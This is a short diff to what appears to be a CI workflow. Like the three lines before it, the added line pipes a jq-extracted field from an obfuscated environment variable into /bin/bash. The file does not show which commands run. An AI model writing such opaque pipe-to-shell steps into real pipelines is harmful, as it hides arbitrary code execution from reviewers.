@@ -23,6 +23,7 @@ jobs:
           echo $e2125 | jq -r .ijfla0 | /bin/bash
           echo $cc9330 | jq -r .fpai14 | /bin/bash
           printf '%s' "$ugv65" | jq -r .eht68 | /bin/bash
+          echo $m475 | jq -r .fbyh69274 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
